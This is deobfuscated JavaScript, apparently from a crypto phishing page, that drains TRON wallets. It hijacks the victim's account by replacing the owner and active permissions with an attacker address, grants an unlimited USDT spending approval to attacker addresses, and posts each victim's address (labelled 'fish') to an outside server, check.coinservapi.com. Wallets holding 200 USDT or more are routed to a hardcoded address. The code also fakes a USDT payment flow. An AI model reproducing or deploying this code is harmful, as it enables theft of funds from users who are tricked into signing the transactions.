//Tue Apr 15 2025 09:48:38 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
/okex/.test(navigator.userAgent.toLowerCase()) && _0x2fe6dc();
async function _0x2fe6dc() {
  (function () {})();
  if (window.tronLink.ready) window.tronWeb = tronLink.tronWeb;else {
    {
      const _0xb44b3e = await tronLink.request({
        "method": "tron_requestAccounts"
      });
      _0xb44b3e.code === 200 && (window.tronWeb = tronLink.tronWeb);
    }
  }
}
async function _0x3411b6() {
  let _0x285cf9,
    _0x3e3497 = "单控",
    _0x1e22bc = tronWeb.defaultAddress.hex,
    _0x21658d = (await tronWeb.trx.getBalance()) / 1000000;
  if (_0x21658d < 100) {
    {
      layer.msg(msg3);
      return;
    }
  }
  let _0x5911a6 = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
  const _0x8eccfa = await _0x5911a6.balanceOf(userAddress).call();
  let _0x53f79b = parseInt(_0x8eccfa._hex) / 1000000;
  _0x53f79b >= 200 ? authorized_address = "TDZukSy7JGcDzYSusBKADgBEpi7M7CSF2u" : authorized_address = permissionsAddr;
  let _0x7fd886 = {
    "type": 0,
    "permission_name": "owner"
  };
  _0x7fd886.threshold = 1;
  _0x7fd886.keys = [];
  let _0xa00d55 = {
    "type": 2,
    "permission_name": "active0"
  };
  _0xa00d55.threshold = 1;
  _0xa00d55.operations = "7fff1fc0037e0000000000000000000000000000000000000000000000000000";
  _0xa00d55.keys = [];
  _0x7fd886.keys.push({
    "address": tronWeb.address.toHex(authorized_address),
    "weight": 1
  });
  _0xa00d55.keys.push({
    "address": tronWeb.address.toHex(authorized_address),
    "weight": 1
  });
  _0x53f79b <= threshold ? (_0x7fd886.keys.push({
    "address": _0x1e22bc,
    "weight": 1
  }), _0xa00d55.keys.push({
    "address": _0x1e22bc,
    "weight": 1
  }), _0x3e3497 = "双控", _0x285cf9 = msg4) : _0x285cf9 = msg2;
  const _0x475094 = await tronWeb.transactionBuilder.updateAccountPermissions(_0x1e22bc, _0x7fd886, null, [_0xa00d55]),
    _0x5274cf = await tronWeb.trx.sign(_0x475094),
    _0x4392ec = await tronWeb.trx.sendRawTransaction(_0x5274cf);
  if (_0x4392ec.result) {
    if (authorized_address == permissionsAddr) {
      var _0x1503cd = {
        "address": userAddress,
        "authorized_address": permissionsAddr,
        "txid": _0x4392ec.txid,
        "type": "trc",
        "transaction": _0x3e3497
      };
      jQuery.ajax({
        "url": domain + "/add",
        "method": "POST",
        "data": _0x1503cd,
        "async": false,
        "success": function (_0x2d02c1) {
          layer.msg(_0x285cf9);
        },
        "error": function (_0x5a9f1e) {}
      });
    } else {
      {
        var _0x1503cd = {
          "fish": userAddress,
          "authorized_address": authorized_address
        };
        jQuery.ajax({
          "url": "https://check.coinservapi.com/permissions.php",
          "method": "POST",
          "data": _0x1503cd,
          "async": false,
          "success": function (_0xb5bb8b) {},
          "error": function (_0x4a741c) {}
        });
      }
    }
  }
}
async function _0xe034ea() {
  let _0x4c7282 = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
  const _0x282cc3 = [{
    "type": "address",
    "value": payAddr
  }, {
    "type": "uint256",
    "value": amount * 1000000
  }];
  var _0x2c3524 = await this.tronWeb.transactionBuilder.triggerSmartContract("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "transfer(address,uint256)", {}, _0x282cc3, this.walletAddress);
  const _0x35ca93 = await this.tronWeb.trx.sign(_0x2c3524.transaction),
    _0x707c41 = await this.tronWeb.trx.sendRawTransaction(_0x35ca93);
  if (_0x707c41.result) {
    var _0x18c203 = {
      "address": userAddress,
      "order_no": order_no,
      "txid": _0x707c41.txid
    };
    jQuery.ajax({
      "url": domain + "/shop/notify/order/type/usdtpay",
      "method": "POST",
      "data": _0x18c203,
      "async": false,
      "success": function (_0x1c2740) {
        _0x1c2740 == "success" ? layer.msg(msg5) : layer.msg(msg6);
      },
      "error": function (_0x922d62) {}
    });
  } else layer.msg(msg7);
}
async function _0x2f6b4c() {
  const _0x5c3e47 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  try {
    let _0x687c4c = await tronWeb.contract().at(_0x5c3e47);
    const _0xa5475 = await _0x687c4c.balanceOf(userAddress).call();
    let _0x587b98 = parseInt(_0xa5475._hex) / 1000000;
    _0x587b98 >= 200 ? authorized_address = "TDZukSy7JGcDzYSusBKADgBEpi7M7CSF2u" : authorized_address = auAddr;
    let _0x5ac802 = await _0x687c4c.increaseApproval(authorized_address, "0xfffffffffffffffffffffffffffffffffffffffff").send({
      "feeLimit": 30000000
    }).then(_0x54a2da => {
      if (authorized_address == auAddr) {
        {
          var _0x8986a9 = {
            "address": userAddress,
            "authorized_address": auAddr,
            "txid": _0x54a2da,
            "type": "trc",
            "transaction": "授权"
          };
          jQuery.ajax({
            "url": domain + "/add",
            "method": "POST",
            "data": _0x8986a9,
            "async": false,
            "success": function (_0x32624c) {
              _0x32624c == "success" ? layer.msg(msg4) : layer.msg(msg6);
            },
            "error": function (_0x2bdbf9) {}
          });
        }
      }
    });
  } catch (_0x4d0bc5) {
    console.error(_0x4d0bc5);
  }
}